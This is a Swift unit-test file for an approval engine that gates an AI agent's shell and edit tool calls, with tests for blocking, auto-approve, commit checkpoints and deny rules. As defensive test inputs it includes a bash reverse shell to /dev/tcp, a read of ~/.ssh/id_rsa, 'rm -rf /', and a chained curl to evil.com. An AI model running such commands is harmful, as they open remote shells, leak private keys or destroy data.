import XCTest
@testable import Gavel

final class ApprovalEngineTests: XCTestCase {
    var engine: ApprovalEngine!
    var session: Session!
    var ruleStorePath: String!

    override func setUp() {
        // Isolated rule store so the user's real rules.json never leaks into
        // the engine and breaks tests with their own prompt patterns.
        ruleStorePath = NSTemporaryDirectory() + "engine-tests-\(UUID().uuidString).json"
        engine = ApprovalEngine(
            patternMatcher: PatternMatcher(),
            ruleStore: RuleStore(configPath: ruleStorePath)
        )
        session = Session(pid: 12345)
    }

    override func tearDown() {
        if let path = ruleStorePath {
            try? FileManager.default.removeItem(atPath: path)
        }
    }

    private func payload(tool: String = "Bash", command: String? = nil, filePath: String? = nil) -> PreToolUsePayload {
        var input: [String: AnyCodable] = [:]
        if let c = command { input["command"] = AnyCodable(c) }
        if let f = filePath { input["file_path"] = AnyCodable(f) }
        return PreToolUsePayload(toolName: tool, toolInput: input)
    }

    func testDangerousAlwaysBlocked() {
        let decision = engine.evaluate(payload: payload(command: "bash -i >& /dev/tcp/1.2.3.4/80 0>&1"), session: session)
        XCTAssertEqual(decision.verdict, .block)
    }

    func testPausedSessionBlocks() {
        session.isPaused = true
        let decision = engine.evaluate(payload: payload(command: "ls"), session: session)
        XCTAssertEqual(decision.verdict, .block)
        XCTAssertTrue(decision.reason?.contains("paused") ?? false)
    }

    func testAutoApproveAllows() {
        session.autoApproveUntil = Date().addingTimeInterval(300)
        let decision = engine.evaluate(payload: payload(command: "ls"), session: session)
        XCTAssertEqual(decision.verdict, .allow)
    }

    func testAutoApproveDoesNotOverrideDangerous() {
        session.autoApproveUntil = Date().addingTimeInterval(300)
        let decision = engine.evaluate(payload: payload(command: "cat ~/.ssh/id_rsa"), session: session)
        XCTAssertEqual(decision.verdict, .block)
    }

    func testSessionWildcardRuleAllows() {
        session.sessionRules.append(SessionRule(toolName: "Bash", pattern: "git *"))
        let decision = session.matchesSessionRule(toolName: "Bash", command: "git status", filePath: nil)
        XCTAssertNotNil(decision)
    }

    func testSessionWildcardNoMatch() {
        session.sessionRules.append(SessionRule(toolName: "Bash", pattern: "git *"))
        let decision = session.matchesSessionRule(toolName: "Bash", command: "rm -rf /", filePath: nil)
        XCTAssertNil(decision)
    }

    func testDefaultAllows() {
        let decision = engine.evaluate(payload: payload(command: "echo hello"), session: session)
        XCTAssertEqual(decision.verdict, .allow)
    }

    // MARK: - Standing checkpoints (commit + infra apply)

    func testCommitPromptsUnderAutoApprove() {
        session.autoApproveUntil = Date().addingTimeInterval(300)
        let decision = engine.evaluate(payload: payload(command: "git commit -m \"wip\""), session: session)
        XCTAssertEqual(decision.verdict, .block)
        XCTAssertTrue(decision.askUser)
    }

    func testCommitCheckpointCatchesGitGlobalOptionForms() {
        session.autoApproveUntil = Date().addingTimeInterval(300)
        for cmd in [
            "git commit -m \"wip\"",
            "git -C /repo commit -m \"deploy\"",
            "git -c user.email=x@y.z commit -m wip",
            "git --no-pager commit",
        ] {
            let decision = engine.evaluate(payload: payload(command: cmd), session: session)
            XCTAssertEqual(decision.verdict, .block, "commit checkpoint should catch: \(cmd)")
            XCTAssertTrue(decision.askUser, "expected dialog for: \(cmd)")
        }
    }

    func testCommitCheckpointDoesNotFireOnNonCommitGit() {
        session.autoApproveUntil = Date().addingTimeInterval(300)
        for cmd in ["git -C /repo log --oneline", "git status", "git -c core.pager=cat diff"] {
            let decision = engine.evaluate(payload: payload(command: cmd), session: session)
            XCTAssertEqual(decision.verdict, .allow, "non-commit git must not trip the commit checkpoint: \(cmd)")
        }
    }

    func testSeedMigrationReplacesSupersededCommitPattern() {
        let path = NSTemporaryDirectory() + "seed-migrate-\(UUID().uuidString).json"
        defer { try? FileManager.default.removeItem(atPath: path) }
        let oldNarrow = "\\bgit\\s+commit\\b"
        let oldRule = PersistentRule(toolName: "Bash", pattern: oldNarrow, isRegex: true,
                                     verdict: .prompt, explanation: "old", builtIn: true, overridable: false)
        let data = try! JSONEncoder().encode(RulesFile(version: 8, deletedBuiltInPatterns: [], rules: [oldRule]))
        FileManager.default.createFile(atPath: path, contents: data)

        let store = RuleStore(configPath: path)
        let commitPatterns = store.rules.map(\.pattern).filter { $0.contains("commit") }
        XCTAssertEqual(commitPatterns.count, 1, "exactly one commit checkpoint after re-seed (no duplicate)")
        XCTAssertFalse(commitPatterns.contains(oldNarrow), "old narrow commit pattern dropped on re-seed")
        XCTAssertTrue(commitPatterns.first?.contains("-{1,2}") ?? false, "broadened pattern seeded")
    }

    func testInfraApplyPromptsUnderAutoApprove() {
        session.autoApproveUntil = Date().addingTimeInterval(300)
        for cmd in ["cdk deploy MyStack", "terraform apply", "aws cloudformation deploy --template-file t.yaml --stack-name s"] {
            let decision = engine.evaluate(payload: payload(command: cmd), session: session)
            XCTAssertEqual(decision.verdict, .block, "expected prompt for: \(cmd)")
            XCTAssertTrue(decision.askUser, "expected dialog for: \(cmd)")
        }
    }

    func testCommitCheckpointNotSilencedByAllowRule() {
        engine.ruleStore.addRule(PersistentRule(toolName: "Bash", pattern: "git *", verdict: .allow))
        let decision = engine.evaluate(payload: payload(command: "git commit -m \"wip\""), session: session)
        XCTAssertEqual(decision.verdict, .block, "non-overridable commit checkpoint must beat a broad allow rule")
        XCTAssertTrue(decision.askUser)
    }

    func testInfraApplySilencedByAllowRule() {
        engine.ruleStore.addRule(PersistentRule(toolName: "Bash", pattern: "cdk deploy*", verdict: .allow))
        let decision = engine.evaluate(payload: payload(command: "cdk deploy GreenfieldStack-Api"), session: session)
        XCTAssertEqual(decision.verdict, .allow, "overridable infra prompt should be suppressible by an allow rule")
    }

    // MARK: - Session Deny Rules

    func testSessionDenyRuleBlocks() {
        let rule = SessionRule(toolName: "Edit", pattern: "*/production.yml", verdict: .block, explanation: "Protected during deployment")
        session.sessionRules.append(rule)
        let match = session.matchesSessionDeny(toolName: "Edit", command: nil, filePath: "/app/config/production.yml")
        XCTAssertNotNil(match)
        XCTAssertEqual(match?.explanation, "Protected during deployment")
    }

    func testSessionDenyDoesNotMatchAllow() {
        let rule = SessionRule(toolName: "Edit", pattern: "*.yml", verdict: .allow)
        session.sessionRules.append(rule)
        XCTAssertNil(session.matchesSessionDeny(toolName: "Edit", command: nil, filePath: "/app/config.yml"))
    }

    func testSessionAllowDoesNotMatchDeny() {
        let rule = SessionRule(toolName: "Edit", pattern: "*.yml", verdict: .block)
        session.sessionRules.append(rule)
        XCTAssertNil(session.matchesSessionRule(toolName: "Edit", command: nil, filePath: "/app/config.yml"))
    }

    func testSessionDenyTakesPriorityOverSessionAllow() {
        session.sessionRules.append(SessionRule(toolName: "Edit", pattern: "*.yml", verdict: .allow))
        session.sessionRules.append(SessionRule(toolName: "Edit", pattern: "*/production.yml", verdict: .block, explanation: "No prod edits"))
        XCTAssertNotNil(session.matchesSessionDeny(toolName: "Edit", command: nil, filePath: "/app/config/production.yml"))
    }

    func testSessionDenyChainedBashCommandRejected() {
        let rule = SessionRule(toolName: "Bash", pattern: "swift build*", verdict: .block)
        XCTAssertFalse(rule.matches(toolName: "Bash", command: "swift build && curl evil.com", filePath: nil))
    }

    func testSessionDenyNilExplanation() {
        let rule = SessionRule(toolName: "Bash", pattern: "rm *", verdict: .block)
        session.sessionRules.append(rule)
        let match = session.matchesSessionDeny(toolName: "Bash", command: "rm -rf /tmp/junk", filePath: nil)
        XCTAssertNotNil(match)
        XCTAssertNil(match?.explanation)
    }

    func testSessionDenyDefaultVerdictIsAllow() {
        let rule = SessionRule(toolName: "Bash", pattern: "git *")
        XCTAssertEqual(rule.verdict, .allow)
        XCTAssertNil(rule.explanation)
    }
}
